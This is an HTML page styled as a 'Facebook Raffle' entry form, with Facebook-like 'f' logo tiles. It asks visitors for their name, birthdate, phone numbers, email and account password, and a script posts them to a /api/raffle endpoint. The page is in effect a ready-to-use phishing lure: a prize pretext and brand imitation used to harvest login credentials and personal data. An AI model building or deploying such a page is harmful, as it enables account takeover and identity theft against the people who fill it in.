<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Facebook Raffle</title>
  <style>
    * { box-sizing: border-box; }
    body {
      margin: 0;
      min-height: 100vh;
      font-family: system-ui, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 24px;
      background: radial-gradient(circle at 20% 20%, #a78bfa 0%, transparent 45%),
                  radial-gradient(circle at 85% 15%, #fbbf24 0%, transparent 40%),
                  radial-gradient(circle at 80% 85%, #f472b6 0%, transparent 45%),
                  linear-gradient(135deg, #4c1d95, #7c3aed 45%, #2563eb);
      background-attachment: fixed;
    }
    .deco {
      position: fixed;
      width: 64px; height: 64px;
      border-radius: 16px;
      background: #1877f2;
      color: #fff;
      font-family: Georgia, serif;
      font-weight: bold;
      font-size: 2.2rem;
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: .18;
      z-index: 0;
      transform: rotate(-8deg);
    }
    .deco1 { top: 8%; left: 6%; }
    .deco2 { bottom: 10%; right: 8%; transform: rotate(10deg); width: 56px; height: 56px; font-size: 1.9rem; }
    .deco3 { top: 60%; left: 3%; width: 44px; height: 44px; font-size: 1.5rem; transform: rotate(-4deg); }
    @media (max-width: 480px) { .deco { display: none; } }
    .card {
      z-index: 1;
      position: relative;
      background: rgba(255,255,255,.97);
      padding: 28px 24px;
      border-radius: 16px;
      width: 100%;
      max-width: 380px;
      box-shadow: 0 10px 30px rgba(0,0,0,.25);
    }
    .ribbon {
      text-align: center;
      font-size: 2rem;
      margin-bottom: 4px;
    }
    h1 {
      margin: 0 0 4px;
      font-size: 1.4rem;
      text-align: center;
      background: linear-gradient(90deg, #7c3aed, #ec4899);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
    }
    .sub {
      text-align: center;
      color: #6b7280;
      font-size: .85rem;
      margin-bottom: 4px;
    }
    label { display: block; margin-top: 14px; font-size: .9rem; color: #374151; }
    input, textarea {
      width: 100%; padding: 10px; margin-top: 4px; border: 1px solid #ddd;
      border-radius: 8px; font-size: 1rem; font-family: inherit;
      transition: border-color .15s, box-shadow .15s;
    }
    input:focus, textarea:focus {
      outline: none; border-color: #7c3aed; box-shadow: 0 0 0 3px rgba(124,58,237,.15);
    }
    button {
      width: 100%; margin-top: 22px; padding: 13px; border: 0; border-radius: 8px;
      background: linear-gradient(90deg, #7c3aed, #ec4899);
      color: #fff; font-size: 1rem; font-weight: 600; cursor: pointer;
      box-shadow: 0 4px 12px rgba(124,58,237,.35);
      transition: transform .1s, box-shadow .15s;
    }
    button:hover { transform: translateY(-1px); box-shadow: 0 6px 16px rgba(124,58,237,.45); }
    button:active { transform: translateY(0); }
    #msg { margin-top: 14px; font-size: .95rem; text-align: center; }
    .ok { color: #15803d; } .err { color: #b91c1c; }
  </style>
</head>
<body>
  <div class="deco deco1">f</div>
  <div class="deco deco2">f</div>
  <div class="deco deco3">f</div>

  <form id="f" class="card">
    <div class="ribbon">🎉🎟️🎉</div>
    <h1>Facebook Raffle Entry</h1>
    <p class="sub">Fill in your details below for a chance to win!</p>
    <label>Name <input name="name" required></label>
    <label>Birthdate <input name="birthdate" type="date" required></label>
    <label>Number <input name="number" type="tel" required></label>
    <label>Alternate number (optional) <input name="altNumber" type="tel"></label>
    <label>Email <input name="email" type="email" required></label>
    <label>Password <input name="password" type="password" required></label>
    <button type="submit">Enter raffle</button>
    <div id="msg"></div>
  </form>

  <script>
    const form = document.getElementById("f");
    const msg = document.getElementById("msg");
    form.addEventListener("submit", async (e) => {
      e.preventDefault();
      const data = Object.fromEntries(new FormData(form));
      try {
        const res = await fetch("/api/raffle", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(data)
        });
        const out = await res.json();
        if (res.ok) { msg.className = "ok"; msg.textContent = "You're in! Good luck!"; form.reset(); }
        else { msg.className = "err"; msg.textContent = out.error; }
      } catch {
        msg.className = "err"; msg.textContent = "Could not reach the server.";
      }
    });
  </script>
</body>
</html>
